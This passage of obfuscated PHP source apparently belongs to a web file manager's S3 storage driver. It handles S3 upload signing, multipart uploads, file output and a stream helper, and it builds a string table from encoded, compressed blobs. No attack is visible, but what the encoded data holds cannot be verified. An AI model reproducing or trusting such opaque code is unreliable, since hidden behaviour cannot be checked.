!empty($·ã¢“ŒÔ[$§™Âê«Ã[1354]]) || !empty($·ã¢“ŒÔ[$§™Âê«Ã[1355]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($®ı·ï™) { parent::__construct($®ı·ï™); } public function uploadFormData($ğ·ÇÒŒÁ, $‘åØ†© = 3600) { $†ò¶—Ş¬ =& $_SERVER[¥ÙÌÜ¾ê]; $¸öëš¡Ü = $†ò¶—Ş¬[192]; $ãÍÊ±ğ = $†ò¶—Ş¬[1272]; $ö€°áÅ’ = $†ò¶—Ş¬[59]; $º½©Ü = gmdate($†ò¶—Ş¬[1273]); $ÉŞ‰ŸğÅ = gmdate($†ò¶—Ş¬[744]); $û„ÂîóØ = $†ò¶—Ş¬[1274]; $±é˜ü·æ = $‘åØ†© . $†ò¶—Ş¬[33]; $ÈØœ§Î· = $†ò¶—Ş¬[1236]; $À¶ƒš±Í = array($this->accessKey, $ÉŞ‰ŸğÅ, $this->region, $ö€°áÅ’, $û„ÂîóØ); $É„‡ÇÛ¯ = implode($†ò¶—Ş¬[8], $À¶ƒš±Í); $ª²•û‡ = array($†ò¶—Ş¬[1238] => gmdate($†ò¶—Ş¬[1237], strtotime($†ò¶—Ş¬[1275])), $†ò¶—Ş¬[1239] => array(array($†ò¶—Ş¬[1241] => $this->bucket), array($†ò¶—Ş¬[1240] => $¸öëš¡Ü), array($†ò¶—Ş¬[1242], $†ò¶—Ş¬[1243], $†ò¶—Ş¬[33]), array($†ò¶—Ş¬[1242], $†ò¶—Ş¬[1276], $†ò¶—Ş¬[33]), array($†ò¶—Ş¬[1242], $†ò¶—Ş¬[1277], $†ò¶—Ş¬[33]), array($†ò¶—Ş¬[1244] => $ÈØœ§Î·), array($†ò¶—Ş¬[1278] => $É„‡ÇÛ¯), array($†ò¶—Ş¬[1279] => $ãÍÊ±ğ), array($†ò¶—Ş¬[1280] => $º½©Ü), array($†ò¶—Ş¬[1281] => $±é˜ü·æ))); $¯¶µ“Ùã = base64_encode(json_encode($ª²•û‡)); $æÑ‰€¡Ò = hash_hmac($†ò¶—Ş¬[1282], $ÉŞ‰ŸğÅ, $†ò¶—Ş¬[1283] . $this->secret, !0); $¢Å¢ë’ = hash_hmac($†ò¶—Ş¬[1282], $this->region, $æÑ‰€¡Ò, !0); $ıÒ×«ªÕ = hash_hmac($†ò¶—Ş¬[1282], $ö€°áÅ’, $¢Å¢ë’, !0); $­¶øÏ€Ê = hash_hmac($†ò¶—Ş¬[1282], $û„ÂîóØ, $ıÒ×«ªÕ, !0); $ØŞ²Î° = hash_hmac($†ò¶—Ş¬[1282], $¯¶µ“Ùã, $­¶øÏ€Ê); $Óé×÷©¿ = array($†ò¶—Ş¬[211] => $†ò¶—Ş¬[33], $†ò¶—Ş¬[1284] => $†ò¶—Ş¬[33], $†ò¶—Ş¬[1240] => $¸öëš¡Ü, $†ò¶—Ş¬[1244] => $ÈØœ§Î·, $†ò¶—Ş¬[1248] => $¯¶µ“Ùã, $†ò¶—Ş¬[1285] => $É„‡ÇÛ¯, $†ò¶—Ş¬[1286] => $ãÍÊ±ğ, $†ò¶—Ş¬[1287] => $º½©Ü, $†ò¶—Ş¬[1288] => $±é˜ü·æ, $†ò¶—Ş¬[1289] => $ØŞ²Î°, $†ò¶—Ş¬[175] => $this->getHost()); return $Óé×÷©¿; } public function multiUploadFormData($Â†ÁªÈî, $·ÙØ¹­ = 3600) { $ÇÍ”ÃµŒ =& $_SERVER[¥ÙÌÜ¾ê]; $Öâ¡ÚÆÖ = gmdate($ÇÍ”ÃµŒ[1366]); $å™îâ¬ = array(); $ÑÜÚ±áó = $this->client->getUploadId($this->bucket, $Â†ÁªÈî, $å™îâ¬); if (!$ÑÜÚ±áó) { return !1; } return array($ÇÍ”ÃµŒ[221] => $ÑÜÚ±áó, $ÇÍ”ÃµŒ[175] => $this->getHost() . $ÇÍ”ÃµŒ[8] . $this->pathEncode($Â†ÁªÈî), $ÇÍ”ÃµŒ[222] => $Öâ¡ÚÆÖ, $ÇÍ”ÃµŒ[93] => $Â†ÁªÈî); } public function multiUploadAuthData($‹‹ÊûĞæ, $Œ¬–ê¦© = array()) { $¡ÎŞú§¥ =& $_SERVER[¥ÙÌÜ¾ê]; $“¦¥’¶© = isset($Œ¬–ê¦©[$¡ÎŞú§¥[168]]) ? $Œ¬–ê¦©[$¡ÎŞú§¥[168]] : $¡ÎŞú§¥[33]; $š©¡‡®ë = $Œ¬–ê¦©[$¡ÎŞú§¥[93]]; unset($Œ¬–ê¦©[$¡ÎŞú§¥[93]]); if (isset($Œ¬–ê¦©[$¡ÎŞú§¥[223]])) { return $this->listUploadParts($š©¡‡®ë, $Œ¬–ê¦©); } $îøÆ–Õ = array(); if (isset($Œ¬–ê¦©[$¡ÎŞú§¥[1367]])) { $îøÆ–Õ[$¡ÎŞú§¥[1368]] = $Œ¬–ê¦©[$¡ÎŞú§¥[1367]]; } $øÄË‡° = explode($¡ÎŞú§¥[177], $this->getHost()); $²ÁÌÈİ• = array($¡ÎŞú§¥[1369] => $øÄË‡°[1], $¡ÎŞú§¥[1370] => $¡ÎŞú§¥[33], $¡ÎŞú§¥[211] => $¡ÎŞú§¥[119], $¡ÎŞú§¥[1284] => $Œ¬–ê¦©[$¡ÎŞú§¥[78]]); $Õ«æğĞ¶ = $¡ÎŞú§¥[226]; $íäáºß° = $¡ÎŞú§¥[8] . $this->pathEncode($š©¡‡®ë) . $“¦¥’¶©; $‘¯áİ¢£ = $this->client->__getSignatureV4($îøÆ–Õ, $²ÁÌÈİ•, $Õ«æğĞ¶, $íäáºß°); if (strpos($“¦¥’¶©, $¡ÎŞú§¥[225]) === 0) { if (isset($îøÆ–Õ[$¡ÎŞú§¥[1368]])) { $’…ÛÉİÇ = $îøÆ–Õ[$¡ÎŞú§¥[1368]]; } else { if (isset($‘¯áİ¢£[$¡ÎŞú§¥[1368]])) { $’…ÛÉİÇ = $‘¯áİ¢£[$¡ÎŞú§¥[1368]]; } else { $’…ÛÉİÇ = hash($¡ÎŞú§¥[1282], $¡ÎŞú§¥[33]); } } return array($¡ÎŞú§¥[232] => $‘¯áİ¢£[$¡ÎŞú§¥[232]], $¡ÎŞú§¥[1368] => $’…ÛÉİÇ, $¡ÎŞú§¥[222] => $‘¯áİ¢£[$¡ÎŞú§¥[1371]]); } return $‘¯áİ¢£[$¡ÎŞú§¥[232]]; } public function listUploadParts($’«Ú¤, $ÒÔ¡òÊ = array()) { $ä…×ßÙ» =& $_SERVER[¥ÙÌÜ¾ê]; $ˆ¦„İ· = str_replace($ä…×ßÙ»[233], $ä…×ßÙ»[33], $ÒÔ¡òÊ[$ä…×ßÙ»[168]]); $½¡Èïµñ = $this->client->listParts($this->bucket, $’«Ú¤, $ˆ¦„İ·); if (!$½¡Èïµñ) { return !1; } $±óèßø¶ = $ä…×ßÙ»[1372]; foreach ($½¡Èïµñ as $İÇĞÓé) { $±óèßø¶ .= $ä…×ßÙ»[1373] . "\74\120\141\x72\164\116\165\x6d\x62\x65\x72\76{$İÇĞÓé[$ä…×ßÙ»[1329]]}\74\57\x50\x61\x72\164\116\x75\155\x62\x65\162\76\xa" . "\x3c\x45\124\141\x67\76{$İÇĞÓé[$ä…×ßÙ»[1330]]}\74\x2f\105\x54\x61\147\x3e\12" . $ä…×ßÙ»[1374]; } $±óèßø¶ .= $ä…×ßÙ»[1375]; $ğøµÙ = array(); $…ìú•ßš = explode($ä…×ßÙ»[177], $this->getHost()); $øšñìÜ = array($ä…×ßÙ»[1369] => $…ìú•ßš[1], $ä…×ßÙ»[211] => $ä…×ßÙ»[119], $ä…×ßÙ»[1284] => strlen($±óèßø¶)); $ßíäì™¾ = $ä…×ßÙ»[224]; $ûåÇ§†ó = $ä…×ßÙ»[8] . $this->pathEncode($’«Ú¤) . $ÒÔ¡òÊ[$ä…×ßÙ»[168]]; $×œ¯ÙÈ = $this->client->__getSignatureV4($ğøµÙ, $øšñìÜ, $ßíäì™¾, $ûåÇ§†ó, $±óèßø¶); return array($ä…×ßÙ»[232] => $×œ¯ÙÈ[$ä…×ßÙ»[232]], $ä…×ßÙ»[222] => $×œ¯ÙÈ[$ä…×ßÙ»[1371]], $ä…×ßÙ»[234] => $½¡Èïµñ, $ä…×ßÙ»[1368] => $×œ¯ÙÈ[$ä…×ßÙ»[1368]]); } public function link($§éİºÕ“, $§–ÉÖš² = array()) { return parent::link($§éİºÕ“, $§–ÉÖš²); } public function fileOut($òÊÚˆ¬˜, $³ÄÈ‚ø‡ = false, $°°÷Ïı = false, $®•ÚŒ²ï = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¥ÙÌÜ¾ê][1376])) { return parent::fileOutServer($òÊÚˆ¬˜, $³ÄÈ‚ø‡, $°°÷Ïı, $®•ÚŒ²ï); } parent::fileOut($òÊÚˆ¬˜, $³ÄÈ‚ø‡, $°°÷Ïı, $®•ÚŒ²ï); } public function fileOutImage($ÄœÔ«ò÷, $óÄ‚²”® = 250) { if (strstr($this->endpoint, $_SERVER[¥ÙÌÜ¾ê][1376])) { return parent::fileOutImageServer($ÄœÔ«ò÷, $óÄ‚²”®); } parent::fileOutImage($ÄœÔ«ò÷, $óÄ‚²”®); } public function fileOutLink($°±®Õğ) { $Û™ê¸ş§ =& $_SERVER[¥ÙÌÜ¾ê]; if (substr($°±®Õğ, 0, 7) == $Û™ê¸ş§[1251]) { $°±®Õğ = $Û™ê¸ş§[1252] . substr($°±®Õğ, 7); } header($Û™ê¸ş§[159] . $°±®Õğ); die; } public function getHost() { $·´üãÄı =& $_SERVER[¥ÙÌÜ¾ê]; $ Ù¶Èöı = str_rtrim(parent::getHost(), $·´üãÄı[8] . $this->bucket); $ Ù¶Èöı = explode($·´üãÄı[177], $ Ù¶Èöı); return $ Ù¶Èöı[0] . $·´üãÄı[177] . $this->bucket . $·´üãÄı[95] . $ Ù¶Èöı[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¿ŞÏùÉÌ, $†ğÄÒô” = 0) { parent::__construct(); $this->source = $¿ŞÏùÉÌ; $this->sourceSize = $†ğÄÒô”; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ü»ùÈŠ× = false) { return $this->sourceSize; } public function getContent($Î¸«¬ÇÜ = false) { return $this->fileSubstr($Î¸«¬ÇÜ, 0, $this->sourceSize); } public function fileSubstr($™ğşô = false, $ñŞç = 0, $„¶ëãáˆ = 0) { if (!$„¶ëãáˆ) { $„¶ëãáˆ = $this->sourceSize; } $ÎÓ‘Ğ¸ = $this->sourceSize - $ñŞç; if ($„¶ëãáˆ >= $ÎÓ‘Ğ¸) { $„¶ëãáˆ = $ÎÓ‘Ğ¸; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ñŞç, $„¶ëãáˆ); } if ($this->sourceType == self::TYPE_FILE) { if ($„¶ëãáˆ <= 0) { return $_SERVER[¥ÙÌÜ¾ê][33]; } $ãúÔ­ğÜ = ftell($this->source); fseek_64($this->source, $ãúÔ­ğÜ + $ñŞç); $ôİ½¨Òì = @fread($this->source, $„¶ëãáˆ); fseek_64($this->source, $ãúÔ­ğÜ); return $ôİ½¨Òì; } } public function hashMd5($ßâ­òãÔ = false) { return md5($this->getContent()); } public static function hash($ù‚öİÛ, $Şí÷İÒ“ = 0) { $ˆãñÎ­ = new PathDriverStream($ù‚öİÛ, $Şí÷İÒ“); return $ˆãñÎ­->hashSimple($ù‚öİÛ); } public static function md5($’ç²ŸŒ, $„üÜ×Îè = 0) { $™ı¿¸Ãú = new PathDriverStream($’ç²ŸŒ, $„üÜ×Îè); return $™ı¿¸Ãú->hashMd5($’ç²ŸŒ); } } goto A¸”çó ¬ù; Dİ½›Í¯¦Å: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\245\331\314\334\276\352", strrev('©´º€ÜÄ')); $_SERVER[¥ÙÌÜ¾ê] = explode("\174\4\174\2\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\245\151\51\1\12\224\237\245\145\33\34\202\227\150\261\235\304\111\234\70\216\154\313\261\22\331\62\222".base64_decode('nAU7KCNpZI0taeSZkbck/dm3EKCFBihLy06BhH0nBMr6ylooWymlhSTspUAplA==')."\102\171\167\71\167\231\221\2\377\373\336\373\276\227\57\211\346\236\273\337\173\356\271\347\234\173\356\271\37\376\362\262\277\155\273\160\355\224\265\273\256\235\262\345\267\47".strrev('\'á"«7PoRm·Ùç³ÑM5tÔÔgõ¿gò`ÿ×ÃïÑïÚîı¬ïÚ÷è«£ıÿ').base64_decode('ngzt9fQNS4I7rnhiYsd3djnl2KvebEaJad5m+qMUDFvRxnXLtiggZRQy+iD91g==').base64_decode('C/TXT3+skZxua/Q70ROJJ2J9vb3BaDwBJcrxeSMNX0XVVPNQeFEzLVSVXFyiaA==')."\x14\xb5\x82\x3\x22\x0\x69\xd5\x56\x93\xaa\x5\x25\x75\xb4\x25\x3a\x82\xbd\xe1\xc8\xca\x44\x7c\x65\x6f\x10\x52\x24\x13\x23\x25\xcd\x9c\xa0\x21\xf2\x19\xb3\x55\xd3\x8e\xeb\x79\x8d\xa7"."\30\63\171\273\332\202\213\103\75\112\74\32\350\211\5\332\343\241\110\17\5\267\107\272\273\103\361\162\170\64\22\16\267\5\332\227\226\307\364\106\3\213\273\3\12\152".strrev('µkö‚ÿ@ÑË”¡AÍüâ¾Dö9¬¨,ı4¹k©ÑúZ•«1¦¬£QŒ…èKN_')."\224\203\61\353\220\3\105\123\317\253\254\353\113\265\11\16\245\37\152\311\66\364\102\212\6\202\343\266\251\12\70\152\161\312\324\362\132\1\212\212\5\303\301\366\270\202"."\x9b\xa9\x74\x46\x23\xdd\xa\x4c\x45\x5e\xb5\x6c\xcd\x54\x96\x77\x5\xa3\x41\x5\x37\xbd\xa5\x9a\xf4\xb8\x5a\xa1\xf9\xfa\x7a\xd0\x80\x28\x81\x70\x58\xd9\x59\x9\xb6\x96\x2f\xb2\x62\x68".base64_decode('ngqFRaIdwajStlIR45Qy8nmj4EOloPm0paYGo1H64QEMDofw1EEg0tkZC/IQdA==')."\xee\xe8\x30\x6a\xc9\x4c\xc0\x52\x47\x28\x9d\xc9\xd9\x89\x51\x35\x57\x62\xc8\x3a\x4c\x7f\xab\xe1\x7\x7e\xd\xb\x10\x78\x44\x2f\xe8\x25\x40\x56\x28\xc2\x30\xf8\xca\x81\x8f\x12\x4b\xad"."\61\210\226\206\217\74\312\157\300\342\102\53\155\224\176\266\54\244\277\363\41\121\62\201\343\64\323\116\150\205\224\221\326\13\260\36\133\141\355\1\6\252\166\266\303\324"."\121\72\50\320\360\245\214\342\104\267\61\12\235\311\350\71\55\314\227\133\306\310\245\65\123\204\213\50\273\34\3\275\322\47\245\334\75\245\274\234\204\7\123\131\75\227"."\66\331\52\375\246\224\210\16\350\231\11\261\32\55\243\144\246\264\20\132\57\42\157\57\157\111\3\44\322\154\33\165\332\142\375\352\53\346\14\65\35\323\114\251\257\235".base64_decode('KGOkZMvAEknWaZj5DkQ3oH60WvS+ChHDbL2kpSH0Ab2r6T/e+59V/YvQf7VA/A==')."\6\240\151\131\55\227\113\150\343\32\254\253\174\172\266\305\372\352\267\222\172\301\217\40\64\30\212\44\262\252\225\355\116\317\116\220\134\214\246\246\265\161\137\61\133\204"."\xa5\xcf\x57\xfb\x80\x3\xef\xf1\xec\xf4\x18\x76\x50\xa2\xcc\x39\x23\xa5\xe6\xe4\x9e\xd2\xef\xac\x6d\x17\x63\x5a\x21\x8d\x7\x4\x7a\x64\x8c\x15\xc8\x80\x15\x35\xd\x12\x75\x78\x94\xb4".base64_decode('0q2sVLqa9WaLZczn+BfrHYdZHGiPA8ZUQVgbt2FQlPmprGqi6Wop2RnvXKAvxQ==')."\x62\x4e\x4f\xa9\xb6\x6e\x14\xfc\x46\xca\xd6\x6c\xaf\x65\x9b\x9a\xa\xa5\x5\x52\x29\xcd\xb2\xbc\xed\x46\xc1\x36\x8d\x9c\x37\x90\xcb\x19\x63\xde\x88\xa9\xf\xea\x85\x66\xa5\xe\xa8\x31"."\212\104\353\335\213\51\144\63\54\342\252\371\12\306\25\114\40\352\150\155\154\161\362\324\246\132\260\62\232\351\15\302\242\151\126\320\174\160\2\311\222\165\350\126\321\260".base64_decode('dNy8ZkW1bTWVxcRFFN/yDen1Qk4vaGVpg+NF3dQs1lZlcXccCkGla95eUx3Mqw==')."\xcd\x4a\xb1\x94\x44\x23\x3\xab\xb7\x2\x8c\xa6\x86\xa1\x69\x56\x52\x38\xe8\x51\xf2\x25\xcb\xf6\x9a\x1a\xa2\x52\x3a\xda\xf\x61\x8e\x43\x19\x6f\x37\x5e\x5a\xba\x96\xf6\xc6\x10\x31\x7"."\360\314\372\131\12\102\33\205\305\121\150\127\74\336\233\10\165\242\75\273\47\230\350\16\304\333\273\240\331\266\72\310\332\34\106\44\232\27\311\200\53\274\150\211\141\304"."\352\101\175\25\300\136\143\114\63\121\305\155\23\315\312\260\221\116\32\343\76\26\205\23\307\20\15\141\211\361\164\27\155\157\124\55\14\342\361\111\116\330\32\240\237\65"."\x3a\xe8\x1c\xe8\xb0\x56\x18\xb4\xb3\x2c\x63\x2c\x18\x5d\x16\x8c\x26\x62\x91\xce\xf8\xf2\x40\x14\x76\xfb\x2\xc2\x92\x71\x56\x15\x2e\x3a\xe7\x8d\x6a\x69\x34\xf4\x29\x9b\xe5\x53\x8b\x78"."\324\130\32\274\60\360\134\261\130\274\130\130\134\70\264\30\17\114\207\327\102\211\274\162\52\126\166\130\317\353\270\355\66\217\41\43\211\130\201\305\320\40\77\351\120\313".base64_decode('QLauZiA9o9aL/q+r7R/o8NWtavXrIo+/wdegNNY3Kb2IN9HVnAKdLktRr0SWfg==')."\xc3\x0\xe0\xad\x4b\x5a\xd6\xae\xa1\xa3\xc0\x68\xf0\xe8\xbe\x60\x2c\x9e\xe8\xe\xc6\xbb\x22\x1d\x50\x43\x30\x0\x5f\x61\x83\x2e\x4d\xd6\xa3\x7e\xfa\xb3\xca\x27\xe8\x31\x9a\xf3\x50\x5e"."\x1d\x74\x51\x69\x1c\xea\x36\x4c\xcd\x9\x11\xbb\xc6\x72\x3d\xcd\xc8\x38\xe\x76\x69\xfa\x60\x16\xfa\xa7\xe3\xd2\x52\x46\xce\x30\xd5\x1c\xa6\x62\xc\x89\x35\x46\x59\x6\xf5\xc\xcc\xf".strrev('ÚpÈ+ú&lfQ“±½8H~Í_	†ooƒY/m›æŠ[>”Ÿ)lì×FEóÓ"˜%').base64_decode('yKuM2yUkSUtTmkRBdY6YLk0V+6Vt2gaGmo4k3ZqdNWCSBjXWpBJvG2tlWstpbA==')."\64\262\32\43\351\365\220\14\355\114\174\254\62\234\274\43\306\15\101\305\226\252\133\121\224\23\63\122\54\274\34\363\273\2\140\363\244\71\264\233\104\222\103\150\271\0"."\47\241\133\235\322\346\237\60\110\34\152\274\52\322\367\232\132\106\207\105\127\100\63\326\255\232\303\54\3\232\41\261\355\340\200\124\130\147\137\70\234\150\217\364\304\21"."\17\115\41\313\243\241\170\220\341\150\240\43\21\150\357\345\233\250\230\161\110\200\11\106\371\156\100\41\243\215\322\116\44\266\54\101\314\331\126\213\211\65\375\106\324\271"."\150\24\54\315\233\202\322\322\202\254\323\24\363\135\64\275\54\207\340\334\307\275\152\176\322\233\107\303\344\345\115\167\356\260\112\134\336\250\103\60\257\202\174\343\201\105"."\202\21\333\332\173\43\61\310\320\212\241\210\173\112\152\46\264\243\267\17\242\362\22\116\55\16\2\160\52\333\255\125\340\235\2\313\143\214\364\226\120\172\123\237\124\105"."\37\133\131\173\240\354\361\174\116\60\204\316\136\171\305\134\304\273\102\75\113\23\335\221\216\140\70\21\352\101\164\51\136\16\357\353\355\10\260\311\225\341\155\221\170\227"."\3\332\207\50\323\262\100\70\344\116\36\134\21\212\305\143\25\243\20\254\57\350\212\101\262\140\157\64\330\31\132\301\203\235\241\140\270\43\226\150\17\264\167\211\64\75"."\201\156\10\44\62\130\32\263\374\316\364\11\104\142\143\134\246\113\214\142\371\224\15\126\302\41\100\45\230\150\220\20\170\200\266\113\15\160\17\272\213\245\142\322\23\340"."\321\123\106\211\141\43\147\23\363\214\252\344\125\130\126\52\333\12\153\350\117\255\22\210\51\166\61\301\351\107\162\202\177\222\156\260\60\142\10\241\176\5\310\175\131\13"."\22\70\115\233\226\341\224\273\62\40\220\261\71\25\160\205\321\272\20\161\150\6\2\104\374\106\230\100\146\44\301\326\232\205\344\225\0\153\116\106\210\276\211\110\157\60"."\x1a\xc0\x82\x73\x62\x79\x34\xd2\xb3\x18\x32\x8c\x65\x35\xd6\x80\x10\xc\x7f\xd\x63\x9f\x40\x7e\xb6\x5\x9\x43\xbc\x8f\xca\x44\x28\x31\xe8\x43\x6\x1b\xca\xb5\xf4\xe7\x28\xfa\x83\xd8".base64_decode('PqhcK7BRT2JqzgkDk4nQamCU2Cjx2pKGkWPrFHEAnB5wyXvIYkgyzojPDLalwQ==')."\216\22\217\54\15\366\44\30\146\321\220\204\215\24\200\144\331\110\24\6\304\66\206\231\100\105\43\243\301\30\133\345\246\66\122\322\331\160\371\175\63\0\213\65\264\151"."\101\365\376\143\7\306\146\324\364\173\147\370\126\241\217\332\272\105\64\10\241\1\237\43\170\44\344\57\231\74\67\146\214\152\254\326\332\346\1\377\200\277\246\265\271\77"."\xe0\x9d\x54\xbd\x93\xf5\xde\x79\xde\x55\x33\x6\x7c\xb5\x33\x0\xb0\x6a\x4d\xa3\x67\xd6\x3a\x9c\x0\x25\x6c\x9d\xb6\xa\xfd\xb4\xc\xb4\x4e\x1f\xf0\x1e\xf5\xd3\xd5\x8b\xfa\x7\x56\x55"."\x37\xcf\x38\x62\xc0\x37\x6d\x60\x6c\x55\x5d\x6d\x2b\xab\x27\x55\x32\x91\xb0\x98\x9a\xe0\x4d\x4d\xcf\xa8\x41\x4d\x42\xc\x13\x4f\x52\x20\x24\x4f\x4a\xc0\x22\x26\xf5\xa2\x80\xae\x69\x5a"."\307\340\150\16\265\101\221\243\337\73\60\143\125\253\224\117\2\271\353\102\314\22\242\277\131\236\56\340\75\6\367\214\147\305\353\36\360\243\124\110\11\352\211\327\105\122"."\x4d\x1\x1d\xd0\x7\xb\x7c\x9\x21\x2e\x80\xb\xe9\x4e\x3e\x7d\xcd\x74\xfa\xbb\x8e\x4d\xe4\xa0\x36\xce\x48\x43\x21\xa3\x9b\x80\x9d\xa5\x82\x3e\xc2\x74\x10\x5\x6d\x4\x3e\xc\x9b\xe1"."\167\122\263\307\64\206\36\10\356\10\43\344\140\202\41\212\222\102\71\302\26\102\15\102\100\323\210\264\2\275\50\46\60\117\66\306\103\151\255\0\363\264\73\244\266\122"."\x6a\x51\x8b\x49\x3d\x4c\x24\xe2\x81\xb6\x70\x30\xc1\x28\xc\x50\x62\x16\x26\x54\xb1\x8d\x6b\xed\x50\xd7\x4\x45\x65\xf4\x21\x25\x98\x74\x22\x8f\xc0\xca\xb7\x46\x72\xa\x21\xc\x8a\x66"."\232\206\331\114\264\223\126\251\210\231\71\44\173\331\150\154\25\44\270\53\55\13\25\72\344\220\57\41\117\100\121\145\234\3\226\245\45\156\0\123\50\150\123\121\314\220"."\x85\x58\x30\xc6\xf\xf9\x6b\x6\x6\x4a\xfd\x5a\x7a\x55\x3f\x42\x7c\xd5\x9b\x59\xb5\x66\xe6\xba\x5a\xc6\xc7\xfb\x7\xd0\x1f\x16\x8\x54\x50\xa2\x25\x38\x35\x4c\xa0\xfd\xd9\x87\xdb\xc1"."\365\40\216\0\217\246\101\303\344\114\123\321\301\166\333\206\255\346\34\105\304\61\204\221\46\266\161\203\312\200\316\166\130\120\54\274\225\113\72\110\102\116\173\270\202\215".strrev('eLÕ4´²¡ŞZÙa6&ş¨êÚ]©Ë@_b1T·ÿ£ı("‘áOlÓÎõ$@+')."\x3b\x4b\xb9\x9c\xcd\x99\xff\x9c\x3e\xc\x35\xc0\x5a\x59\x5d\x29\x6d\xa7\x61\x32\x21\xb7\xe\xea\xad\xaa\xab\x94\x30\x54\x28\x20\x91\x54\xc6\x2d\xb1\xab\x2e\xe\x20\xfe\x25\xae\xd4\x30"."\xf5\x9e\x12\xea\x51\xda\x22\x91\x70\x30\xd0\xa3\xe0\xd\x1c\x36\x1e\xc4\x1d\xc4\x82\xbd\x1\xb4\x6b\x61\x71\x39\x16\xf\x46\x61\xa3\xea\xf0\xb2\x72\x57\x78\x43\x20\x50\xf1\xf\x3d\xcd"."\346\11\21\73\233\101\101\341\5\41\314\137\172\260\156\307\203\271\10\17\152\256\7\13\113\36\301\323\173\204\306\314\63\252\153\143\344\203\263\326\36\340\270\75\266\152".strrev(']â!à8˜{°óMaç-Qµ…ÆĞğNF-bÎÈ5Š$H\'VèğêğÄ³'."\0".'f"')."\7\64\253\17\55\34\150\26\371\104\364\61\353\301\250\202\61\325\43\64\172\120\235\44\177\170\204\154\342\31\64\215\122\261\227\325\44\205\150\143\0\40\132\312\1\121"."\303\260\75\114\336\364\224\213\242\225\307\256\162\323\311\140\273\353\206\211\302\121\345\103\362\55\63\123\76\370\116\221\152\15\55\21\104\363\165\154\363\162\244\21\163\311"."\xd6\x53\x4e\x13\x21\x3c\xda\xe2\x6b\x99\x58\x8f\xb8\x43\x9d\xea\xa8\x8c\x66\x95\x50\x8e\x6d\x21\xc\x3d\x85\x8a\x5d\x68\x80\x5\x4b\xeb\x16\x2e\xdd\xfa\x5b\x5c\x69\x5c\x1d\x8c\x49\xd5"."\xd9\xea\x20\xab\xab\x42\x2c\xfd\x8e\x6a\xa9\x89\x94\x10\x50\x3b\x24\xb1\xd7\x19\xe2\x13\x40\x56\x4a\x25\x2c\xaf\x3c\xb1\x1c\x73\xf9\x3c\x4c\xdd\x7d\x77\x36\x90\xc\x9d\xf9\xa4\x3a\x56".base64_decode('wbevP+gJIWeRomAIaGMxSY2hDaozp8IO1ChHAzH1OEN4+fgIcSVnHjGurQgHOw==').strrev('6p\\²9T•b©n¯jˆÕ¦µa‰J\\6l£Š'."\n".'3şB±8y ‘ºL"’Êã').base64_decode('wsOCSjl24eGWBwHvQ6T7YqdhoIjY2ErAxakWyFNYSQ1fGoOJqZWRj8yvG8Da5Q==')."\xa8\x17\x7\xc5\xc2\x61\x28\xa1\xe0\xa\x3c\x12\xdf\x81\xc9\x87\x57\x2c\x1\x29\x8\x3f\xce\x91\x77\x21\xa6\x6b\x57\xc4\x23\xd5\xab\x17\x26\xf4\x82\xac\xaa\x12\x50\xb1\xb1\x8a\x7d\x1d"."\x2f\x64\x97\x72\xad\x63\x67\xdf\x74\xb7\x10\xaa\x30\xf\xa8\xc8\x3c\x39\xbd\x30\x2c\xed\xb9\x42\xf\x83\x5a\x8f\xb3\x4a\x6d\x87\x92\x5c\x2d\x67\x94\x14\x3a\xdd\x87\x4\xfb\x84\x6b\x21"."\3\342\147\125\123\214\51\243\70\170\331\13\5\40\116\42\202\122\262\214\72\52\170\16\107\36\211\156\130\366\4\153\275\374\351\54\224\6\73\166\26\350\342\372\212\112"."\x41\x99\x24\xe9\x56\x18\x8d\x5d\xa5\x6f\xd2\xd3\xb8\x51\x31\x88\xb5\x68\xec\xdb\x20\xf8\xcf\xe\xb5\x1d\xfb\x3d\x91\xf8\x6b\x18\xc\x18\x8a\x84\xa4\x7\xe0\x94\xca\x99\x8f\x36\x30\xc0"."\211\75\142\322\163\150\213\63\175\170\61\55\306\73\226\274\131\160\342\156\341\335\121\306\320\230\206\126\21\100\104\151\261\262\70\71\265\320\1\341\215\100\154\34\154\344"."\305\272\24\263\41\26\241\3\161\6\105\113\113\50\105\242\274\121\30\371\53\207\73\115\203\263\272\234\17\160\47\152\47\262\244\55\17\275\264\211\113\3\345\340\67\312"."\100\122\36\67\347\341\202\272\202\356\361\206\255\212\202\230\246\131\115\347\365\202\317\244\233\236\17\111\10\160\146\354\251\227\130\62\101\251\326\130\144\153\201\115\162\235".base64_decode('CwFsw0Bip+kzUc2iQcD0l/g0rIJWkaJEOolYkpiwwQRYvP6Dad3GELzLGUw9LQ==').base64_decode('EkrnthwmU1+yiZRNgmDoPdMdKStt9b46sjv7Kh9H4wNt+iXZcOT5CTcB+izbKA==')."\212\30\51\110\243\245\50\121\250\224\212\17\64\151\7\102\365\64\341\137\305\100\221\264\220\227\10\267\164\65\371\162\50\205\164\154\22\352\10\230\46\103\37\332\71\254"."\111\107\100\31\204\351\122\214\341\176\245\215\206\26\36\34\25\266\31\264\50\134\261\217\256\104\237\232\116\107\230\146\133\376\56\117\52\53\372\52\27\104\314\145\170\121".base64_decode('Uqhy8kAuJw7R3eGdZqGLTs4kQ3aarZNIluy0qxKMyxwyQ+1koIVJg5vRdtLSnQ==')."\x73\x1f\x3b\x21\x36\x62\x42\x2b\x87\xd1\x4e\xdd\x9e\xd5\xb\x9a\xc5\x37\x5c\xd3\xaa\x44\x3b\xfe\x3f\xb3\xb9\xe5\x73\x80\xd7\xca\xce\x10\x7\xc7\x49\xca\x61\x53\xc3\x0\x79\x77\xe5\x1a"."\120\101\232\44\6\202\154\306\11\333\301\372\104\111\31\322\342\161\340\3\132\254\264\317\170\173\10\105\320\142\254\214\241\356\164\32\323\1\23\72\67\316\267\70\71\23"."\xc2\x28\xcc\x37\xed\xac\x4c\x16\xcd